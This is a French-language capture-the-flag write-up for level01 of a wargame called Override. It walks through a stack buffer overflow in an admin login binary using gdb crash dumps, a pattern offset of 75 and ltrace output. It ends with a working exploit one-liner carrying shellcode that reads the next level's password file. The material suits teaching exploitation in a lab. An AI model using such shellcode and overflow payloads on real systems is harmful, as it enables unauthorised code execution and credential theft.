# Level 01

- En testant des entrée trop longue on voit que la deuxieme entrée peut etre overflow
<pre>
$> gdb ./level01 
gdb-peda$ r < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'B' * 500)")
Starting program: /home/alarm/42/Override/level01/Ressources/level01 < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'B' * 500)")
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
ESP: 0xffffd5b0 ('B' <repeats 15 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
</pre>
- On calcule donc le offset pour ecrire sur la Return Address
<pre>
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')")
Starting program: /home/alarm/42/Override/level01/Ressources/level01 < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')")
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
ESP: 0xffffd5a0 ("AAKAAgAA6AAL\n")
EIP: 0x35414166 ('fAA5')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x35414166
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x35414166 in ?? ()
gdb-peda$ pattern offset fAA5
fAA5 found at offset: 75
</pre>
- On recupere l'adress de la stack ou sera stocker le shellcode
<pre>
$> (echo dat\_wil; echo admin) | ltrace ./level01 1>&-
\_\_libc\_start\_main(0x80484d0, 1, -10540, 0x80485c0, 0x8048630 <unfinished ...>
puts("\*\*\*\*\*\*\*\*\* ADMIN LOGIN PROMPT \*\*\*"...)                            = 39
printf("Enter Username: ")                                             = 16
<strong>fgets("dat\_wil\n", 256, 0xf7fcfac0)                                    = 0x0804a040</strong>
puts("verifying username....\n")                                       = 24
puts("Enter Password: ")                                               = 17
fgets("admin\n", 100, 0xf7fcfac0)                                      = 0xffffd5ec
puts("nope, incorrect password...\n")                                  = 29
+++ exited (status 1) +++
</pre>
- Il suffit maintenant de lancer la commande
```
$> (python -c "print('dat_wil0' + 'jsh.pashl02/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')"; python -c "print('admin' + 'B' * 75 + '\x48\xa0\x04\x08')") | ./level01
```

